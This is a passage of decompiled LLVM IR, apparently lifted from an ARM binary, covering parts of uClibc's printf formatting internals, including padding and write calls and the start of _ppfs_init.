  store i32 %v2_c2dc, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_c220 = trunc i32 %v0_c210 to i8
  %v2_c220 = load i32, i32* %r7.global-to-local, align 4
  %v4_c220 = add i32 %v2_c220, %v5_c200
  %v5_c220 = inttoptr i32 %v4_c220 to i8*
  store i8 %v1_c220, i8* %v5_c220, align 1
  %v0_c370.pre.pre = load i32, i32* @r8, align 4
  %v1_c370.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c36cthread-pre-split

dec_label_pc_c228:                                ; preds = %dec_label_pc_c1a0
  br i1 %v3_c22c, label %dec_label_pc_c2c4, label %dec_label_pc_c230

dec_label_pc_c230:                                ; preds = %dec_label_pc_c228
  %v3_c230 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_c230, i32* %r0.global-to-local, align 4
  %v1_c238 = inttoptr i32 %v3_c230 to i32*
  %v2_c238 = load i32, i32* %v1_c238, align 4
  br i1 %v7_c228, label %dec_label_pc_c238, label %dec_label_pc_c29c

dec_label_pc_c238:                                ; preds = %dec_label_pc_c230
  store i32 %v2_c238, i32* @r4, align 4
  %v2_c23c = icmp eq i32 %v2_c238, 0
  br i1 %v2_c23c, label %dec_label_pc_c268, label %dec_label_pc_c244

dec_label_pc_c244:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c2cc
  %v0_c248 = phi i32 [ %v2_c238, %dec_label_pc_c238 ], [ %v4_c2e4, %dec_label_pc_c2cc ]
  %v3_c244 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v4_c24c = ashr i32 %v3_c244, 31
  %v5_c24c = or i32 %v4_c24c, %v3_c244
  %v2_c250 = inttoptr i32 %v0_c248 to i8*
  %v3_c250 = call i32 @strnlen(i8* %v2_c250, i32 %v5_c24c)
  store i32 %v3_c250, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_c250, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_c36c

dec_label_pc_c268:                                ; preds = %dec_label_pc_c238, %dec_label_pc_c1b8
  %v3_c268 = load i32, i32* %stack_var_-348, align 4
  %v1_c26c = icmp slt i32 %v3_c268, 0
  br i1 %v1_c26c, label %dec_label_pc_c284, label %dec_label_pc_c274

dec_label_pc_c274:                                ; preds = %dec_label_pc_c268
  %tmp212 = icmp ult i32 %v3_c268, 6
  br i1 %tmp212, label %dec_label_pc_c28c, label %dec_label_pc_c284

dec_label_pc_c284:                                ; preds = %dec_label_pc_c274, %dec_label_pc_c268
  br label %dec_label_pc_c28c

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c274, %dec_label_pc_c284
  %storemerge97 = phi i32 [ 6, %dec_label_pc_c284 ], [ 0, %dec_label_pc_c274 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38132), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_c36c

dec_label_pc_c29c:                                ; preds = %dec_label_pc_c230
  store i32 %v2_c238, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_c2dc, i32* @r4, align 4
  store i32 %v2_c238, i32* %stack_var_-200, align 4
  br label %dec_label_pc_c36cthread-pre-split

dec_label_pc_c2c4:                                ; preds = %dec_label_pc_c228
  br i1 %v7_c2c4, label %dec_label_pc_c2cc, label %dec_label_pc_c2f0

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c2c4
  %v0_c2d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_c2d0, i32* %r0.global-to-local, align 4
  %v3_c2d4 = load i16, i16* @global_var_23164.175, align 2
  %v4_c2d4 = sext i16 %v3_c2d4 to i32
  %v2_c2d8 = add i32 %v4_c2d4, %v0_c2d0
  %v3_c2d8 = inttoptr i32 %v2_c2d8 to i32*
  %v4_c2d8 = load i32, i32* %v3_c2d8, align 4
  store i32 %v4_c2d8, i32* @r0, align 4
  %v0_c2e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c2e0 = add i32 %v0_c2e0, 108
  store i32 %v1_c2e0, i32* @r2, align 4
  %v4_c2e4 = call i32 @__GI___glibc_strerror_r(i32 %v4_c2d8, i32 %v2_c2dc, i32 %v1_c2e0, i32 %v4_c2d4)
  store i32 %v4_c2e4, i32* %r0.global-to-local, align 4
  store i32 %v4_c2e4, i32* @r4, align 4
  br label %dec_label_pc_c244

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c2c4
  %v4_c2f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 536) to i32*), align 4
  %v1_c300 = add i32 %v4_c2f8, 10
  store i32 %v1_c300, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c304

dec_label_pc_c304:                                ; preds = %dec_label_pc_c34c, %dec_label_pc_c2f0
  %v1_c314 = phi i32 [ %v1_c34c, %dec_label_pc_c34c ], [ %v4_c2f8, %dec_label_pc_c2f0 ]
  %v1_c304 = inttoptr i32 %v1_c314 to i8*
  %v2_c304 = load i8, i8* %v1_c304, align 1
  %v3_c304 = zext i8 %v2_c304 to i32
  store i32 %v3_c304, i32* %r2.global-to-local, align 4
  %v9_c30c = icmp eq i32 %v3_c304, %tmp99
  br i1 %v9_c30c, label %dec_label_pc_c314, label %dec_label_pc_c34c

dec_label_pc_c314:                                ; preds = %dec_label_pc_c304
  %v2_c314 = sub i32 %v1_c314, %v4_c2f8
  %v0_c318 = load i32, i32* @fp, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  store i32 %v2_c31c, i32* @r1, align 4
  store i32 %v2_c320, i32* %r2.global-to-local, align 4
  %v4_c328 = mul i32 %v2_c314, 4
  %v5_c328 = add i32 %v4_c328, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 13432)
  %v6_c328 = inttoptr i32 %v5_c328 to i32*
  %v7_c328 = load i32, i32* %v6_c328, align 4
  store i32 49972, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_c328)
  %v0_c334 = load i32, i32* %r0.global-to-local, align 4
  %v1_c334 = icmp slt i32 %v0_c334, 0
  br i1 %v1_c334, label %dec_label_pc_c4c4, label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c314
  %v2_c340 = add i32 %v0_c334, %v1_c39c
  store i32 %v2_c340, i32* @r1, align 4
  br label %dec_label_pc_c4b0

dec_label_pc_c34c:                                ; preds = %dec_label_pc_c304
  %v1_c34c = add i32 %v1_c314, 1
  store i32 %v1_c34c, i32* @r1, align 4
  %v3_c350 = icmp ult i32 %v1_c34c, %v1_c300
  br i1 %v3_c350, label %dec_label_pc_c304, label %dec_label_pc_c4c4

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c1c8
  %v0_c35c = load i32, i32* @sl, align 4
  store i32 %v0_c35c, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_c35c, i32* @r4, align 4
  br label %dec_label_pc_c36c

dec_label_pc_c36cthread-pre-split:                ; preds = %.thread85, %dec_label_pc_c158, %dec_label_pc_c210, %dec_label_pc_c29c
  %v1_c370.pre = phi i32 [ %v1_c370.pre205, %dec_label_pc_c158 ], [ %v1_c370.pre.pre, %dec_label_pc_c210 ], [ 1, %dec_label_pc_c29c ], [ %v2_c0d8, %.thread85 ]
  %v0_c370.pre = phi i32 [ 0, %dec_label_pc_c158 ], [ %v0_c370.pre.pre, %dec_label_pc_c210 ], [ 0, %dec_label_pc_c29c ], [ %v2_c14c, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_c0cc, %dec_label_pc_c158 ], [ %v0_bffc, %dec_label_pc_c210 ], [ %v0_bffc, %dec_label_pc_c29c ], [ %v0_c0cc, %.thread85 ]
  %v0_c36c.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c36cthread-pre-split, %dec_label_pc_c28c, %dec_label_pc_c244, %dec_label_pc_c35c
  %v1_c370 = phi i32 [ %v1_c370.pre, %dec_label_pc_c36cthread-pre-split ], [ %storemerge97, %dec_label_pc_c28c ], [ %v3_c250, %dec_label_pc_c244 ], [ %v6_c1dc, %dec_label_pc_c35c ]
  %v0_c370 = phi i32 [ %v0_c370.pre, %dec_label_pc_c36cthread-pre-split ], [ 0, %dec_label_pc_c28c ], [ 0, %dec_label_pc_c244 ], [ %v0_c35c, %dec_label_pc_c35c ]
  %v0_c378 = phi i32 [ %v0_c36c.pr, %dec_label_pc_c36cthread-pre-split ], [ 11, %dec_label_pc_c28c ], [ 11, %dec_label_pc_c244 ], [ 11, %dec_label_pc_c35c ]
  %v0_c3b8 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_c36cthread-pre-split ], [ %v0_bffc, %dec_label_pc_c28c ], [ %v0_bffc, %dec_label_pc_c244 ], [ %v0_bffc, %dec_label_pc_c35c ]
  %v7_c36c = icmp eq i32 %v0_c378, 11
  %v2_c370 = add i32 %v1_c370, %v0_c370
  br i1 %v7_c36c, label %dec_label_pc_c388, label %bb173

bb173:                                            ; preds = %dec_label_pc_c36c
  %v7_c380 = icmp sgt i32 %v0_c378, 5
  %. = select i1 %v7_c380, i32 2, i32 1
  %v2_c384 = add i32 %v2_c370, %.
  br label %dec_label_pc_c388

dec_label_pc_c388:                                ; preds = %dec_label_pc_c36c, %bb173
  %v0_c39c = phi i32 [ %v2_c370, %dec_label_pc_c36c ], [ %v2_c384, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_c38c = icmp uge i32 %tmp98, %v0_c39c
  %v9_c38c = icmp eq i32 %tmp98, %v0_c39c
  %v2_c390 = xor i1 %v9_c38c, true
  %v3_c390 = and i1 %v3_c38c, %v2_c390
  br i1 %v3_c390, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_c388
  %v2_c38c = sub i32 %tmp98, %v0_c39c
  store i32 %v2_c38c, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_c388, %bb174
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v2_c398 = xor i1 %v3_c38c, true
  %v3_c398 = or i1 %v9_c38c, %v2_c398
  br i1 %v3_c398, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_c3a0.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_c3b0 = phi i32 [ %v1_c3a0.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_c39c = add i32 %v0_c39c, %v1_c39c
  %v2_c3a0 = add i32 %v2_c39c, %v2_c3b0
  %v0_c3ac = load i32, i32* @sb, align 4
  %v7_c3ac = icmp eq i32 %v0_c3ac, 48
  br i1 %v7_c3ac, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_c3b0 = add i32 %v2_c3b0, %v0_c370
  store i32 %v3_c3b0, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_c3c8 = phi i32 [ %v2_c3b0, %bb177 ], [ 0, %bb178 ]
  %v1_c3b8 = and i32 %v0_c3b8, 8
  store i32 %v1_c3b8, i32* @r7, align 4
  %v2_c3b8 = icmp eq i32 %v1_c3b8, 0
  br i1 %v2_c3b8, label %dec_label_pc_c3c0, label %dec_label_pc_c3dc

dec_label_pc_c3c0:                                ; preds = %.thread30
  %v0_c3c0 = load i32, i32* @fp, align 4
  store i32 %v0_c3c0, i32* %r0.global-to-local, align 4
  store i32 %v0_c3c8, i32* %r2.global-to-local, align 4
  %v4_c3cc = call i32 @_charpad(i32 %v0_c3c0, i8 32, i32 %v0_c3c8)
  store i32 %v4_c3cc, i32* %r0.global-to-local, align 4
  %v1_c3d0 = load i32, i32* @sl, align 4
  %v9_c3d0 = icmp eq i32 %v4_c3cc, %v1_c3d0
  br i1 %v9_c3d0, label %dec_label_pc_c3d8, label %dec_label_pc_c4c4

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3c0
  %v0_c3d8 = load i32, i32* @r7, align 4
  store i32 %v0_c3d8, i32* @sl, align 4
  %v0_c3e4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %.thread30, %dec_label_pc_c3d8
  %v0_c3e4 = phi i32 [ %v0_c378, %.thread30 ], [ %v0_c3e4.pre, %dec_label_pc_c3d8 ]
  %v0_c3e0 = load i32, i32* @fp, align 4
  %v2_c3e4 = add i32 %v0_c3e4, add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -38124)
  store i32 %v2_c3e4, i32* %r0.global-to-local, align 4
  %v2_c3e8 = inttoptr i32 %v2_c3e4 to i8*
  %v3_c3e8 = call i32 @__GI_fputs_unlocked(i8* %v2_c3e8, i32 %v0_c3e0)
  %v0_c3ec = load i32, i32* @fp, align 4
  store i32 %v0_c3ec, i32* %r0.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r8, align 4
  store i32 %v0_c3f4, i32* %r2.global-to-local, align 4
  %v4_c3f8 = call i32 @_charpad(i32 %v0_c3ec, i8 48, i32 %v0_c3f4)
  store i32 %v4_c3f8, i32* %r0.global-to-local, align 4
  %v1_c3fc = load i32, i32* @r8, align 4
  %v9_c3fc = icmp eq i32 %v4_c3f8, %v1_c3fc
  br i1 %v9_c3fc, label %dec_label_pc_c404, label %dec_label_pc_c4c4

dec_label_pc_c404:                                ; preds = %dec_label_pc_c3dc
  %v3_c404 = load i32, i32* %stack_var_-44, align 4
  %v2_c408 = icmp eq i32 %v3_c404, 0
  br i1 %v2_c408, label %dec_label_pc_c410, label %dec_label_pc_c434

dec_label_pc_c410:                                ; preds = %dec_label_pc_c404
  %v0_c410 = load i32, i32* @r5, align 4
  %v2_c410 = icmp eq i32 %v0_c410, 0
  br i1 %v2_c410, label %dec_label_pc_c498, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c410
  %v0_c418 = load i32, i32* @r4, align 4
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v0_c420 = load i32, i32* @fp, align 4
  store i32 %v0_c420, i32* %r2.global-to-local, align 4
  %v3_c424 = inttoptr i32 %v0_c420 to i16*
  %v4_c424 = call i32 @__stdio_fwrite(i32 %v0_c418, i32 %v0_c410, i16* %v3_c424)
  store i32 %v4_c424, i32* %r0.global-to-local, align 4
  %v1_c428 = load i32, i32* @r5, align 4
  %v9_c428 = icmp eq i32 %v4_c424, %v1_c428
  br i1 %v9_c428, label %dec_label_pc_c498, label %dec_label_pc_c4c4

dec_label_pc_c434:                                ; preds = %dec_label_pc_c404
  store i32 %v2_c2dc, i32* @r6, align 4
  store i32 %v2_c1cc, i32* @r8, align 4
  store i32 %v2_c1d8, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_c484.pr = load i32, i32* @r5, align 4
  %v2_c48441 = icmp eq i32 %v0_c484.pr, 0
  store i32 %v2_c1cc, i32* @r1, align 4
  store i32 %v2_c2dc, i32* @r0, align 4
  br i1 %v2_c48441, label %dec_label_pc_c498, label %dec_label_pc_c44c

dec_label_pc_c44c:                                ; preds = %dec_label_pc_c434, %dec_label_pc_c480
  %v1_c450 = phi i32 [ %v2_c480, %dec_label_pc_c480 ], [ %v0_c484.pr, %dec_label_pc_c434 ]
  %v2_c44c = icmp ult i32 %v1_c450, 128
  %.v1_c450 = select i1 %v2_c44c, i32 %v1_c450, i32 128
  store i32 %.v1_c450, i32* %r2.global-to-local, align 4
  %v6_c458 = call i32 @__GI_wcsrtombs(i32 %v2_c2dc, i32 %v2_c1cc, i32 %.v1_c450, i32 %v2_c1d8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c458, i32* @r4, align 4
  %v2_c45c = icmp eq i32 %v6_c458, 0
  store i32 %v6_c458, i32* %r0.global-to-local, align 4
  br i1 %v2_c45c, label %dec_label_pc_c480, label %dec_label_pc_c468

dec_label_pc_c468:                                ; preds = %dec_label_pc_c44c
  store i32 %v2_c2dc, i32* %r0.global-to-local, align 4
  %v0_c470 = load i32, i32* @fp, align 4
  store i32 %v0_c470, i32* %r2.global-to-local, align 4
  %v3_c474 = inttoptr i32 %v0_c470 to i16*
  %v4_c474 = call i32 @__stdio_fwrite(i32 %v2_c2dc, i32 %v6_c458, i16* %v3_c474)
  store i32 %v4_c474, i32* %r0.global-to-local, align 4
  %v1_c478 = load i32, i32* @r4, align 4
  %v9_c478 = icmp eq i32 %v4_c474, %v1_c478
  br i1 %v9_c478, label %dec_label_pc_c480, label %dec_label_pc_c4c4

dec_label_pc_c480:                                ; preds = %dec_label_pc_c468, %dec_label_pc_c44c
  %v0_c480 = phi i32 [ %v4_c474, %dec_label_pc_c468 ], [ 0, %dec_label_pc_c44c ]
  %v1_c480 = load i32, i32* @r5, align 4
  %v2_c480 = sub i32 %v1_c480, %v0_c480
  store i32 %v2_c480, i32* @r5, align 4
  %v2_c484 = icmp eq i32 %v2_c480, 0
  store i32 %v2_c1cc, i32* @r1, align 4
  store i32 %v2_c2dc, i32* @r0, align 4
  br i1 %v2_c484, label %dec_label_pc_c498, label %dec_label_pc_c44c

dec_label_pc_c498:                                ; preds = %dec_label_pc_c480, %dec_label_pc_c434, %dec_label_pc_c418, %dec_label_pc_c410
  %v0_c498 = load i32, i32* @fp, align 4
  store i32 %v0_c498, i32* %r0.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @sl, align 4
  store i32 %v0_c4a0, i32* %r2.global-to-local, align 4
  %v4_c4a4 = call i32 @_charpad(i32 %v0_c498, i8 32, i32 %v0_c4a0)
  store i32 %v4_c4a4, i32* %r0.global-to-local, align 4
  %v1_c4a8 = load i32, i32* @sl, align 4
  %v9_c4a8 = icmp eq i32 %v4_c4a4, %v1_c4a8
  br i1 %v9_c4a8, label %dec_label_pc_c4b0, label %dec_label_pc_c4c4

dec_label_pc_c4b0:                                ; preds = %dec_label_pc_c498, %dec_label_pc_c33c, %dec_label_pc_c190, %dec_label_pc_bfa0
  %stack_var_-336.4 = phi i32 [ %v0_bffc, %dec_label_pc_bfa0 ], [ %v0_c3b8, %dec_label_pc_c498 ], [ %v0_bffc, %dec_label_pc_c33c ], [ %v0_bffc, %dec_label_pc_c190 ]
  %stack_var_-356.3 = phi i32 [ %v1_c39c, %dec_label_pc_bfa0 ], [ %v2_c3a0, %dec_label_pc_c498 ], [ %v2_c340, %dec_label_pc_c33c ], [ %v2_c194, %dec_label_pc_c190 ]
  %v3_c4b0 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_c4b0, i32* @r4, align 4
  store i32 %v3_c4b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bec8.outer

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_bf24
  %v1_c4bc = add i32 %v0_bf2c, 2
  store i32 %v1_c4bc, i32* @r4, align 4
  br label %dec_label_pc_bec8.outer36

dec_label_pc_c4c4:                                ; preds = %dec_label_pc_c34c, %dec_label_pc_c1c8, %dec_label_pc_c498, %dec_label_pc_c418, %dec_label_pc_c3dc, %dec_label_pc_c3c0, %dec_label_pc_c314, %dec_label_pc_c1f0, %dec_label_pc_c168, %bb142, %dec_label_pc_c468
  br label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %dec_label_pc_bf18, %bb, %dec_label_pc_be5c, %dec_label_pc_c4c4
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_be5c ], [ -1, %dec_label_pc_c4c4 ], [ %v1_c39c, %dec_label_pc_bf18 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_be0c, i32* @r5, align 4
  store i32 %v9_be0c, i32* @r6, align 4
  store i32 %v12_be0c, i32* @r7, align 4
  store i32 %v15_be0c, i32* @r8, align 4
  store i32 %v18_be0c, i32* @sb, align 4
  store i32 %v21_be0c, i32* @sl, align 4
  store i32 %v24_be0c, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_c4bc, { 1, 0 }
  uselistorder i32 %v3_c4b0, { 1, 2, 0 }
  uselistorder i32 %v2_c480, { 1, 2, 0 }
  uselistorder i32 %v0_c3c8, { 1, 0 }
  uselistorder i32 %v2_c3b0, { 2, 0, 1 }
  uselistorder i1 %v9_c38c, { 1, 0 }
  uselistorder i32 %v2_c370, { 1, 0 }
  uselistorder i32 %v0_c3b8, { 1, 0 }
  uselistorder i32 %v0_c370, { 1, 0 }
  uselistorder i32 %v1_c34c, { 1, 2, 0 }
  uselistorder i32 %v1_c314, { 1, 0, 2 }
  uselistorder i32 %v4_c2e4, { 1, 2, 0 }
  uselistorder i32 %v4_c2d4, { 1, 0 }
  uselistorder i32 %v0_c248, { 1, 0 }
  uselistorder i32 %v2_c238, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c200, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c178, { 1, 0 }
  uselistorder i32 %v2_c0d8, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_c0f4, { 1, 2, 3, 0 }
  uselistorder i32 %v2_c074, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_bfdc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_bf80.pre, { 1, 0, 2 }
  uselistorder i32 %v1_bf78, { 1, 0 }
  uselistorder i32 %v1_bf24, { 0, 1, 3, 2 }
  uselistorder i32 %v1_c39c, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_bee4, { 0, 2, 1 }
  uselistorder i32 %v1_bedc.lcssa, { 1, 0 }
  uselistorder i8 %v2_bec8, { 1, 0 }
  uselistorder i32 %v2_bedc, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_bef4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bffc, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_c0ec, { 1, 0 }
  uselistorder i1 %v7_c03c, { 1, 2, 0 }
  uselistorder i1 %v7_c228, { 1, 0 }
  uselistorder i1 %v7_c1a0, { 1, 0 }
  uselistorder i1 %v7_c07c, { 1, 0 }
  uselistorder i32 %v2_c1d8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_c1cc, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_c31c, { 1, 0 }
  uselistorder i32 %v2_c2dc, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_bf7c, { 1, 3, 2, 0 }
  uselistorder i32 %v4_bf58, { 1, 0 }
  uselistorder i32 %v2_be14, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 22, 12, 13, 14, 15, 16, 17, 18, 0, 20, 21, 23, 25, 24, 1, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 37, 38, 34, 35, 39, 40, 36, 1, 42, 41, 44, 43, 46, 45, 48, 47, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -95100), { 1, 0 }
  uselistorder label %dec_label_pc_c4cc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_c4c4, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_c44c, { 1, 0 }
  uselistorder label %dec_label_pc_c3dc, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_c388, { 1, 0 }
  uselistorder label %dec_label_pc_c36c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_c36cthread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c28c, { 1, 0 }
  uselistorder label %dec_label_pc_c244, { 1, 0 }
  uselistorder label %dec_label_pc_c158, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %dec_label_pc_c028, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf74, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_bf18, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_bee4, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_bec8.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_c500 = load i32, i32* @r4, align 4
  %v6_c500 = load i32, i32* @r5, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_c50c = load i32, i32* @r1, align 4
  store i32 %v0_c50c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c518 = bitcast i32* %arg1 to i8*
  %v4_c518 = call i32 @__GI_memset(i8* %v3_c518, i32 0, i32 152)
  store i32 %v4_c518, i32* %r0.global-to-local, align 4
  %v0_c51c = load i32, i32* @r4, align 4
  %v1_c51c = add i32 %v0_c51c, 24
  %v2_c51c = inttoptr i32 %v1_c51c to i32*
  %v3_c51c = load i32, i32* %v2_c51c, align 4
  store i32 %v3_c51c, i32* %r3.global-to-local, align 4
  %v0_c520 = load i32, i32* @r5, align 4
  %v2_c520 = inttoptr i32 %v0_c51c to i32*
  store i32 %v0_c520, i32* %v2_c520, align 4
  %v0_c524 = load i32, i32* %r3.global-to-local, align 4
  %v1_c524 = add i32 %v0_c524, -1
  %v1_c528 = load i32, i32* @r4, align 4
  %v2_c528 = add i32 %v1_c528, 24
  %v3_c528 = inttoptr i32 %v2_c528 to i32*
  store i32 %v1_c524, i32* %v3_c528, align 4
  %v0_c52c = load i32, i32* @r4, align 4
  %v1_c52c = add i32 %v0_c52c, 40
  store i32 %v1_c52c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c53c21 = inttoptr i32 %v1_c52c to i32*
  store i32 8, i32* %v2_c53c21, align 4
  %v3_c53c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_c53c23 = add i32 %v3_c53c22, 4
  store i32 %v4_c53c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c538.dec_label_pc_c538_crit_edge

dec_label_pc_c538.dec_label_pc_c538_crit_edge:    ; preds = %entry, %dec_label_pc_c538.dec_label_pc_c538_crit_edge
  %v4_c53c24 = phi i32 [ %v4_c53c23, %entry ], [ %v4_c53c, %dec_label_pc_c538.dec_label_pc_c538_crit_edge ]
  %v0_c538.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_c53c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538.pre, -1
  store i32 %v1_c538, i32* %r3.global-to-local, align 4
  %v7_c538 = icmp eq i32 %v0_c538.pre, 1
  %v2_c53c = inttoptr i32 %v4_c53c24 to i32*
  store i32 %v0_c53c.pre, i32* %v2_c53c, align 4
  %v3_c53c = load i32, i32* %r2.global-to-local, align 4
  %v4_c53c = add i32 %v3_c53c, 4
  store i32 %v4_c53c, i32* %r2.global-to-local, align 4
  br i1 %v7_c538, label %dec_label_pc_c544, label %dec_label_pc_c538.dec_label_pc_c538_crit_edge

dec_label_pc_c544:                                ; preds = %dec_label_pc_c538.dec_label_pc_c538_crit_edge
  %v0_c544 = load i32, i32* @r5, align 4
  store i32 %v0_c544, i32* %r2.global-to-local, align 4
  %v1_c5842 = inttoptr i32 %v0_c544 to i8*
  %v2_c5843 = load i8, i8* %v1_c5842, align 1
